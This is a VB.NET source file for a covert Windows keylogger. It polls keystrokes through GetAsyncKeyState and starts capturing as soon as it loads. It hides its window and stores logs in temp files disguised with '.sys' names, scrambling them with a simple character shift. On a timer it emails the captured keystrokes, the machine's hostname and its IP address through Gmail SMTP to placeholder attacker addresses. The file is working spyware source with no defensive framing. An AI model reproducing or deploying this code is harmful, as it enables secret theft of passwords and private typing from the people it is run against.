' libraries
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Net.Mail

Public Class frm
    Dim bufer As String
    Dim numBuf As Integer
    Dim SrcBuffer As String
    Dim bufArray(9999) As String
    Dim salt As Integer


    Sub FlushBufer()
        bufer = ""
        salt = 0
        numBuf = 0
        For i = 0 To UBound(bufArray)
            bufArray(i) = ""
        Next
    End Sub
    ' declarations
    Dim buffer As New List(Of String)
    Dim buffercat As String
    Dim stagingpoint As String
    Dim actual As String
    Dim initlog As Boolean = False
    Dim log As StreamWriter

    ' threading
    Public thread_scan As Thread
    Public thread_hide As Thread

    ' thread-safe calling for thread_hide
    Delegate Sub Change()
    Dim objchange As New Change(AddressOf DoHide)


    Private Sub frmKeyRogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        

        Me.Text = ""
        lblAbout.Text = "About"
        GroupBox1.Text = "Control Panel"
        cmdBegin.Text = "Start"
        cmdEnd.Text = "End"
        cmdEnd.Enabled = False
        cmdClear.Text = "Clear"
        'initiate hide thread
        thread_hide = New Thread(AddressOf HideIt)
        thread_hide.IsBackground = True
        thread_hide.Start()
        status.Text = "Ready."

        'autostart
        Refresh()
        thread_scan = New Thread(AddressOf Scan)
        thread_scan.IsBackground = True
        thread_scan.Start()
        cmdBegin.Enabled = False
        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        If chkFile.Checked = True Then
            Try
                log = New StreamWriter(sPath & "/ntr.sys", True)
            Catch
                End
            End Try

        End If

        status.Text = "Doing that thing..."

        cmdEnd.Enabled = True

    End Sub
    ' write out keystroke log to file on close event
    Private Sub frmKeyRogger_Closed(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Closed
      
        Thread.Sleep(200)
        thread_scan.Abort()
        buffer.Clear()
        cmdBegin.Enabled = True
        cmdEnd.Enabled = False
        Call WriteOut()
        status.Text = "Stopped..."
        Refresh()

        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        If logEdit.Text = "" Then
            ' Call checker()
            Thread.Sleep(200)
            End
        Else
            ' Call checker()
            Thread.Sleep(200)
            Call WriteOut()
        End If

        Dim filename As String = sPath & "/adb.exe"
        Dim writer As BinaryWriter
        Dim reader As BinaryReader
        Dim tmpStringData As String
        Dim tmpByteData As Byte
        Dim tmpCharData As Char
        Dim tempIntData As Integer
        Dim tempBoolData As Boolean
        '
        writer = New BinaryWriter(File.Open(filename, FileMode.Append))
        Using writer
            'writer.Write("apple")
            writer.Write(1)   'byte
            'writer.Write(YourCharHere)   'char
            'writer.Write(1.31459)        'single
            'writer.Write(100)        'integer
            'writer.Write(False)        'boolean
        End Using
        writer.Close()
        '
        If (File.Exists(filename)) Then
            reader = New BinaryReader(File.Open(filename, FileMode.Open))
            Using reader
                tmpStringData = reader.ReadString()
                'tempByteData = reader.ReadByte()
                'tempCharData = reader.ReadChar()
                'tempSingleData = reader.ReadSingle()
                'tempIntData = reader.ReadInt32()
                'tempBoolData = reader.ReadBoolean()
            End Using
            reader.Close()
        End If





    End Sub
    Sub checker()
        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        If My.Computer.FileSystem.FileExists(sPath & "/ntr.sys") Then
            My.Computer.FileSystem.DeleteFile(sPath & "/ntr.sys")
        Else
            Thread.Sleep(1)
        End If
    End Sub


    ' getkey, API call to USER32.DLL
    <DllImport("USER32.DLL", EntryPoint:="GetAsyncKeyState", SetLastError:=True,
    CharSet:=CharSet.Unicode, ExactSpelling:=True,
    CallingConvention:=CallingConvention.StdCall)>
    Public Shared Function getkey(ByVal Vkey As Integer) As Boolean
    End Function


    Private Sub cmdBegin_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdBegin.Click
        Refresh()
        thread_scan = New Thread(AddressOf Scan)
        thread_scan.IsBackground = True
        thread_scan.Start()
        cmdBegin.Enabled = False
        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        If chkFile.Checked = True Then
            Try
                log = New StreamWriter(sPath & "/ntr.sys", True)
            Catch
                End
            End Try

        End If

        status.Text = "Doing that thing..."

        cmdEnd.Enabled = True
    End Sub

    ' checks for keypresses with delay, upon detection of pressed key, calls AddToBuffer
    Public Sub Scan()
        Dim foo As Integer
        While 1

            For foo = 1 To 93 Step 1
                If getkey(foo) Then
                    AddtoBuffer(foo, getkey(16))
                End If
            Next

            For foo = 186 To 192 Step 1
                If getkey(foo) Then
                    AddtoBuffer(foo, getkey(16))
                End If
            Next

            BufferToOutput()
            buffer.Clear()

            Thread.Sleep(120)
            SetText(stagingpoint)
        End While
    End Sub


    ' parses keycode and saves to buffer to be written
    Public Sub AddtoBuffer(ByVal foo As Integer, ByVal modifier As Boolean)
        If Not (foo = 1 Or foo = 2 Or foo = 8 Or foo = 9 Or foo = 13 Or (foo >= 17 And foo <= 20) Or foo = 27 Or (foo >= 32 And foo <= 40) Or (foo >= 44 And foo <= 57) Or (foo >= 65 And foo <= 93) Or (foo >= 186 And foo <= 192)) Then
            Exit Sub
        End If

        Select Case foo
            Case 48 To 57
                If modifier Then
                    Select Case foo
                        Case 48
                            actual = ")"
                        Case 49
                            actual = "!"
                        Case 50
                            actual = "@"
                        Case 51
                            actual = "#"
                        Case 52
                            actual = "$"
                        Case 53
                            actual = "%"
                        Case 54
                            actual = "^"
                        Case 55
                            actual = "&"
                        Case 56
                            actual = "*"
                        Case 57
                            actual = "("
                    End Select
                Else
                    actual = Convert.ToChar(foo)
                End If
            Case 65 To 90
                If modifier Then
                    actual = Convert.ToChar(foo)
                Else
                    actual = Convert.ToChar(foo + 32)
                End If
            Case 1
                'actual = "<LCLICK>"
                actual = ""
            Case 2
                actual = "<RCLICK>"
            Case 8
                actual = "<BACKSPACE>"
            Case 9
                actual = "<TAB>"
            Case 13
                actual = "<ENTER>"
            Case 17
                actual = "<CTRL>"
            Case 18
                actual = "<ALT>"
            Case 19
                actual = "<PAUSE>"
            Case 20
                actual = "<CAPSLOCK>"
            Case 27
                actual = "<ESC>"
            Case 32
                actual = " "
            Case 33
                actual = "<PAGEUP>"
            Case 34
                actual = "<PAGEDOWN>"
            Case 35
                actual = "<END>"
            Case 36
                actual = "<HOME>"
            Case 37
                actual = "<LEFT>"
            Case 38
                actual = "<UP>"
            Case 39
                actual = "<RIGHT>"
            Case 40
                actual = "<DOWN>"
            Case 44
                actual = "<PRNTSCRN>"
            Case 45
                actual = "<INSERT>"
            Case 46
                actual = "<DEL>"
            Case 47
                actual = "<HELP>"
            Case 186
                If modifier Then
                    actual = ":"
                Else
                    actual = ";"
                End If
                actual = ";"

            Case 187
                If modifier Then
                    actual = "+"
                Else
                    actual = "="
                End If
            Case 188
                If modifier Then
                    actual = "<"
                Else
                    actual = ","
                End If
            Case 189
                If modifier Then
                    actual = "_"
                Else
                    actual = "-"
                End If
            Case 190
                If modifier Then
                    actual = ">"
                Else
                    actual = "."
                End If
            Case 191
                If modifier Then
                    actual = "?"
                Else
                    actual = "/"
                End If
            Case 192
                If modifier Then
                    actual = "~"
                Else
                    actual = "`"
                End If
        End Select

        If buffer.Count <> 0 Then
            Dim bar As Integer = 0
            While bar < buffer.Count
                If buffer(bar) = actual Then
                    Exit Sub
                End If
                bar += 1
            End While
        End If

        buffer.Add(actual)


    End Sub

    ' writes buffer to output box
    Public Sub BufferToOutput()
        If buffer.Count <> 0 Then
            Dim qux As Integer = 0
            While qux < buffer.Count
                buffercat = buffercat & buffer(qux)
                qux += 1
            End While
            'SetText(txtOutput.Text & buffercat)
            stagingpoint = stagingpoint & buffercat
            buffercat = String.Empty
        End If
    End Sub

    Delegate Sub SetTextCallback(ByVal [text] As String)

    ' thread safe call to output text to output box
    Private Sub SetText(ByVal [text] As String)
        If txtOutput.InvokeRequired Then
            Dim d As New SetTextCallback(AddressOf SetText)
            Me.Invoke(d, New Object() {[text]})
        Else
            txtOutput.Text = [text]
        End If
    End Sub

    Private Sub cmdEnd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdEnd.Click
        thread_scan.Abort()
        buffer.Clear()
        cmdBegin.Enabled = True
        cmdEnd.Enabled = False
        Call WriteOut()
        status.Text = "Stopped..."
        Refresh()
        Application.Restart()

    End Sub

    Private Sub cmdClear_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdClear.Click
        txtOutput.Clear()
        stagingpoint = String.Empty
    End Sub



    Private Sub frmKeyRogger_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        If Me.WindowState = FormWindowState.Minimized Then
            Me.Hide()
        End If
    End Sub

    Public Sub WriteOut()
        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        If chkFile.Checked = False Then
            Exit Sub
        End If
        Dim tm As System.DateTime
        tm = Now

        Try
            log.WriteLine(vbNewLine)
        Catch
            log = New StreamWriter(sPath & "/ntr.sys", True)
        End Try
        log.WriteLine(tm)
        If stagingpoint <> Nothing Then
            log.WriteLine(stagingpoint)
        End If
        log.WriteLine(vbNewLine)
        log.Flush()
        log.Close()
        'hides file/sets as hidden
        Call enc()

        Dim strHostName As String

        Dim strIPAddress As String



        strHostName = System.Net.Dns.GetHostName()

        strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()
        Dim lolk As String = Now.ToShortTimeString


        'Start by creating a mail message object
        Dim MyMailMessage As New MailMessage()

        'From requires an instance of the MailAddress type
        MyMailMessage.From = New MailAddress("insertyouremail")

        'To is a collection of MailAddress types
        MyMailMessage.To.Add("insertyouremail")

        MyMailMessage.Subject = "Log For: " & strHostName & "  ---  " & strIPAddress & "  @   " & lolk
        Dim string1 As String = logEdit.Text
        MyMailMessage.Body = string1

        'Create the SMTPClient object and specify the SMTP GMail server
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("insertemail", "insertpass")
        SMTPServer.EnableSsl = True
        Try
            SMTPServer.Send(MyMailMessage)

        Catch ex As SmtpException
        End Try
        Application.Restart()
    End Sub

    Sub enc()
        Thread.Sleep(200)
        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        Dim s As String
        Dim tr As IO.TextReader = New IO.StreamReader(sPath & "/ntr.sys")
        s = tr.ReadToEnd
        logEdit.Text = s
        Dim sa As String
        sa = logEdit.Text
        SrcBuffer = sa
        salt = 7
        For i = 0 To Len(SrcBuffer) - 1
            logEdit.SelectionStart = i
            logEdit.SelectionLength = 1
            bufArray(i) = logEdit.SelectedText
            numBuf = (Asc(bufArray(i)) + salt)
            On Error GoTo error1
            bufArray(i) = Chr(numBuf)
            bufer = bufer + bufArray(i)
        Next
        logEdit.Text = bufer


        FlushBufer()
        log.Close()
        Call save()
error1:
        FlushBufer()

    End Sub

    Sub save()
        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        Dim fs
        Dim a
        fs = CreateObject("Scripting.FileSystemObject")
        a = fs.CreateTextFile(sPath & "/ntrs.sys", True)
        a.WriteLine(logEdit.Text)
        a.Close()
        log.Close()
        My.Computer.FileSystem.DeleteFile(sPath & "/ntr.sys")
        My.Computer.FileSystem.DeleteFile(sPath & "/ntr.sys")
        Dim asd As String
        asd = logEdit.Text
        logEdit.Text = ""
    End Sub
    Sub dec()
        Dim sPath As String
        sPath = System.IO.Path.GetTempPath
        Dim s As String
        Dim tr As IO.TextReader = New IO.StreamReader(sPath & "/ntrs.sys")
        s = tr.ReadToEnd
        logEdit.Text = s
        Dim sa As String
        sa = logEdit.Text
        SrcBuffer = sa
        salt = 7

        For i = 0 To Len(SrcBuffer) - 1
            logEdit.SelectionStart = i
            logEdit.SelectionLength = 1
            bufArray(i) = logEdit.SelectedText
            numBuf = (Asc(bufArray(i)) - salt)
            On Error GoTo error1
            bufArray(i) = Chr(numBuf)
            bufer = bufer + bufArray(i)
        Next

        logEdit.Text = bufer

        Dim fs
        Dim a
        fs = CreateObject("Scripting.FileSystemObject")
        a = fs.CreateTextFile(sPath & "/ntrss.sys", True)
        a.WriteLine(logEdit.Text)
        a.Close()

        FlushBufer()
        Exit Sub
error1:
        FlushBufer()
    End Sub
    Sub error1()
        FlushBufer()

    End Sub

    ' ctrl+shift+s toggles hide form
    Public Sub HideIt()
        While 1
            If getkey(17) And getkey(160) And getkey(83) Then
                Me.Invoke(objchange)
            End If
            Thread.Sleep(200)
        End While
    End Sub

    Public Sub DoHide()
        If Me.Visible = True Then
            Me.Visible = False
        Else
            Me.Visible = True
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Call WriteOut()
        Timer1.Start()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Call dec()
    End Sub
End Class
